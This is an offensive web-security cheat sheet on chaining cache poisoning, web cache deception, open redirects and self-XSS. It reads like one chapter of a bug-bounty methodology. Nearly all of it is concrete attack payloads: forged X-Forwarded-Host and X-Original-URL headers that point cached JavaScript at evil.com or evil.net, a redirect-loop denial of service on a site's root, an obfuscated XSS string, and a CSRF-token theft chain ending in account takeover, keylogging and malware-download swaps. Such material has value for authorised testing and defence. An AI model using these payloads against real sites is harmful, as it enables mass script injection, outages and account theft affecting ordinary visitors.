# 07 — Cache-What-Where & Multi-Input Chaining

Weaponize vulnerabilities that are "unexploitable" alone because they need special headers or victim interaction. Cache poisoning removes the "attacker can't send custom headers cross-origin" barrier.

## Cache-what-where basics
- **Header→redirect→script poison:** `GET /main.js` + `X-Forwarded-Host: evil.com` → 302 stored under `/main.js` → homepage loads it → victims redirected to attacker JS.
- **Cacheable redirect defacement:** if origin marks redirect `Cache-Control: public, max-age=…` → arbitrary poisoning without a static extension.
- **Self/Referer XSS → stored:** a reflected XSS needing interaction becomes stored, hitting all visitors (ref 02-§8).

## Redirect-loop / port DoS on root
```
GET /?xxx  Host: redacted.com
X-Forwarded-Scheme: http    → 301 to https://redacted.com/ cached under / → loop → site-wide DoS
```
Time via `Age` + `max-age`; poison right after refresh. Works on `/` itself (higher impact than assets). Always use a unique buster during recon.

## WCD → CSRF-token theft → ATO ($16,500 series)
1. Self-XSS in profile/name (`"xss","a":top[8680439..toString(30)](document.domain),//`).
2. WCD caches the authed page + anti-CSRF token: `/my-account/personal-information.woff2?triagethis`.
3. Fetch cached URL unauth → extract `CSRFToken`.
4. Invisible auto-submit POST to `/my-account/update-profile` with the stolen token.
Dual ATO routes: (a) change email → password reset; (b) keylogger payload captures passwords.

## Persistent redirect hijacking + nested poisoning
**Drupal/Symfony `destination` open redirect:**
```
GET //?destination=https://evil.net\@target.com/   → browser normalizes \→/ → Location resolves to evil.net
```
**Force any page to redirect, poison the JS import:**
```
GET /?destination=https://evil.net\@business.target.com/
X-Original-URL: /foo.js?v=1     → cache key /foo.js?v=1, origin 302 to evil.net → attacker JS on every visitor
```

## Nested cache poisoning (internal → external)
1. Poison **internal** cache so `/redir` → redirect to evil.com: `GET / ` + `X-Original-URL: /redir` + `X-Forwarded-Host: evil.com`.
2. Poison **external** cache so `/download?v=1` serves the pre-poisoned `/redir`: `GET /download?v=1` + `X-Original-URL: /redir` → "Download" fetches malware. Also: spoof RSS, swap login→phishing, stored XSS via dynamic script import.

## General chaining patterns
- **Host + scheme → arbitrary redirect:** `X-Forwarded-Host: attacker.com` + `X-Forwarded-Scheme: nothttps` → `Location: https://attacker.com/en` → steal CSRF/headers via cross-origin POST; DOM-XSS via redirected JSON.
- **Cookie-domain override + redirect:** set cookie `domain=attacker.com` alongside the redirect.
- **WAF-bypass headers tunneled through an allowed redirect chain.**

**Rule:** a single unkeyed input may only confuse part of the stack — combine two (or internal+external caches) when neither alone suffices.
